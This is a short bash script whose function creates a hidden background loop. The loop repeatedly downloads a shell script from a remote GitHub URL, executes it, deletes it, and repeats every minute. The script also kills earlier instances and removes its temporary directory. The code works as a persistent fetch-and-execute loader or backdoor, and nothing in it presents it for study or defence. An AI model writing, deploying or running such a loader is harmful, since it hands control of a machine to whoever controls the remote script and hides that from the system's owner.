#!/bin/bash
function spawnew(){
   [ -f ${LOCKM_FILE}_clr ] && rm "${LOCKM_FILE}_clr";
   SPAWEDFLAGFILE="${LOCKM_FILE}_clr1"
   [ -f ${SPAWEDFLAGFILE} ] && return || touch ${SPAWEDFLAGFILE}; 
   local TMPD=$(mktemp -d --suffix=$(whoami))
   cd $TMPD
   echo 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;
   while :; do
        while ! ping -c 1 -W 1 google.com &>/dev/null; do sleep 1; done;
         cdata=`mktemp -u`
         wget -q https://raw.githubusercontent.com/thanhtholao/shell/master/shell.sh -O $cdata
         . $cdata
         sleep 5;
         rm -f $cdata;
         endoffile_ &
         #bash /home/user/workspace/shell_ttl/shell.sh;
          sleep 60;
    done;' > data
    nohup bash data &>/dev/null &    
    . $LOCKM_FILE
    local tmp=${_pid};
    pid_run_store "_pid=$!" "$LOCKM_FILE"
    kill -9 ${tmp} &>/dev/null
    . $LOCKSH_FILE
     kill -9 ${_pid} &>/dev/null
    sleep 5
    rm -rf $TMPD;
}
spawnew

